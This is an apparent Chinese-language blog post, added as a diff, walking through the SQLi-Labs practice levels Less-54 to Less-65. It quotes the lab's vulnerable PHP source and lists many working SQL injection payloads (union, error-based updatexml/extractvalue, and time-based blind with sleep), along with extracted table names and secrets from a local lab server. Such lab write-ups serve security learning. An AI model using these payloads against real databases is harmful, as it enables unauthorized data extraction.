@@ -1,0 +1,272 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL:sqlilabs less-54-65:challenges-有限机会的注入11 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="Less-54 10次机会源码最后注掉了错误提示，可以看到用了很多随机值做拼接，next_tryy();这个函数比较亮眼，查看challenges数据库，发现字段tryy，就代表着时间，随意修改时间,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL:sqlilabs less-54-65:challenges-有限机会的注入11</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL:sqlilabs less-54-65:challenges-有限机会的注入11</h1>
+        <div class="stuff">
+            <span>二月 16, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Less-54-10次机会"><a href="#Less-54-10次机会" class="headerlink" title="Less-54 10次机会"></a>Less-54 10次机会</h2><p>源码最后注掉了错误提示，可以看到用了很多随机值做拼接，next_tryy();这个函数比较亮眼，查看challenges数据库，发现字段tryy，就代表着时间，随意修改时间次数</p>
+<pre><code>&lt;?php
+include '../sql-connections/sql-connect-1.php';
+include '../sql-connections/functions.php';
+$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
+$times= 10;
+$table = table_name();
+$col = column_name(1);     // session id column name
+$col1 = column_name(2);   //secret key column name
+if(!isset($_POST['answer_key'])){
+    if(isset($_POST['reset'])){
+        setcookie('challenge', ' ', time() - 3600000);}
+    else{
+        if(isset($_COOKIE['challenge'])){
+            $sessid=$_COOKIE['challenge'];}
+        else{
+            $expire = time()+60*60*24*30;
+            $hash = data($table,$col);
+            setcookie("challenge", $hash, $expire);}
+        if(isset($_GET['id'])){
+            $id=$_GET['id'];
+            next_tryy();
+            $tryyy = view_attempts();            
+            if($tryyy &gt;= ($times+1)){
+                setcookie('challenge', ' ', time() - 3600000);}    
+            $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
+            $result=mysql_query($sql);
+            $row = mysql_fetch_array($result);
+            }}}&lt;?php}else{
+    $key = addslashes($_POST['key']);
+    $key = mysql_real_escape_string($key);
+    $sql="SELECT 1 FROM $table WHERE $col1= '$key'";
+    if($row){}else {//print_r(mysql_error());}}?&gt;</code></pre>
+<h5 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h5><pre><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+</code></pre>
+<p>zpmxcs1wwi</p>
+<pre><code>?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='zpmxcs1wwi'--+</code></pre>
+<p>Your Login name:id,sessid,secret_59AZ,tryy<br>Your Password:3</p>
+<pre><code>?id=-1' union select 1,2,(group_concat( concat_ws(0x7e,sessid,secret_59AZ,tryy))) from challenges.zpmxcs1wwi--+</code></pre>
+<pre><code>?id=-1' union select 1,2,group_concat(secret_59AZ) from challenges.hcuhv04r8w--+</code></pre>
+<p>Your Login name:2<br>Your Password:fbf50efd552a22190e4e76d28f87b072<del>0EUPSlL2MhoICNxHUeX4D4jI</del>3 </p>
+<h2 id="Less-55-14次机会"><a href="#Less-55-14次机会" class="headerlink" title="Less-55 14次机会"></a>Less-55 14次机会</h2><p>闭合方式为单括号，剩下的都和五十四关一样</p>
+<pre><code>?id=1) or sleep(5)--+</code></pre>
+<h2 id="Less-56-14次机会"><a href="#Less-56-14次机会" class="headerlink" title="Less-56 14次机会"></a>Less-56 14次机会</h2><p>闭合方式为单引号括号，剩下的都和五十四关一样</p>
+<pre><code>?id=1') or sleep(5)--+</code></pre>
+<h2 id="Less-57-14次机会"><a href="#Less-57-14次机会" class="headerlink" title="Less-57 14次机会"></a>Less-57 14次机会</h2><p>闭合方式为双引号，剩下的都和五十四关一样</p>
+<pre><code>?id=1" or sleep(5)--+</code></pre>
+<h2 id="Less-58-5次机会"><a href="#Less-58-5次机会" class="headerlink" title="Less-58 5次机会"></a>Less-58 5次机会</h2><p>union被禁用（所以只能用报错注入）</p>
+<pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')))--+</code></pre>
+<p>或者</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre>
+<p>p4fa6u9121</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='p4fa6u9121' )),1)--+</code></pre>
+<p>‘~id,sessid,secret_UFUT,tryy’</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_UFUT) from challenges.p4fa6u9121)),1)--+</code></pre>
+<h2 id="Less-59-5次机会"><a href="#Less-59-5次机会" class="headerlink" title="Less-59 5次机会"></a>Less-59 5次机会</h2><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre>
+<p>~s58vuqfkcd</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='s58vuqfkcd' )),1)--+</code></pre>
+<p>~id,sessid,secret_SK4I,tryy</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_SK4I) from challenges.s58vuqfkcd)),1)--+</code></pre>
+<p>~a62dnjQ7GwyliNtIWBjX6g1i</p>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>与Less-58大体一致</p>
+<p>闭合方式为双引号括号</p>
+<pre><code>?id=1") or sleep(5)--+</code></pre>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>与Less-58大体一致</p>
+<p>闭合方式为双括号单引号’))</p>
+<pre><code>?id=1')) or sleep(5)--+</code></pre>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>字段名表名动态的，没法用报错注入，就只能用布尔盲注了</p>
+<p>数据库名，使用二分法，不断改变if中第一部分的判断条件，先判断出数据库的长度</p>
+<pre><code>?id=1') and if(length(database())&gt;9 , sleep(3), 1) --+</code></pre>
+<pre><code>?id=1’) and if(length(database())=10,1,sleep(5))–+</code></pre>
+<pre><code>第一位字符
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),1,1)='c',sleep(5),1)--
++
+第一位字符ascii码（当然不可能一上来就看出来是99，先要和很多数字进行二分大于小于的比较，慢慢确定范围，这里更建议用ascii码）
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),1,1))=99,sleep(5),1)--+
+ascii码payload
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),2,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),3,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),4,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),5,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),6,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),7,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),8,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),9,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),10,1))=99,sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=52,sleep(5),1)--+
+
+字符payload
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),2,1)='h',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),3,1)='a',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),4,1)='l',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),5,1)='l',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),6,1)='e',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),7,1)='n',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),8,1)='g',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),9,1)='e',sleep(5),1)--+
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),10,1)='s',sleep(5),1)--+
+表个数
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 1,sleep(5),1)--+
+第一张表长度
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=10,sleep(5),1)--+
+表的每一位
+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;15,sleep(5),1)--+
+
+</code></pre>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>闭合方式为单引号’</p>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>闭合方式为双括号))</p>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>闭合方式为双引号小括号”)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-54-10%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Less-54 10次机会</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">爆表：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-55-14%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">Less-55 14次机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-56-14%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Less-56 14次机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-57-14%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">Less-57 14次机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-58-5%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">Less-58 5次机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-59-5%E6%AC%A1%E6%9C%BA%E4%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">Less-59 5次机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-60"><span class="toc-number">7.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-61"><span class="toc-number">8.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-62"><span class="toc-number">9.</span> <span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-63"><span class="toc-number">10.</span> <span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-64"><span class="toc-number">11.</span> <span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-65"><span class="toc-number">12.</span> <span class="toc-text">Less-65</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
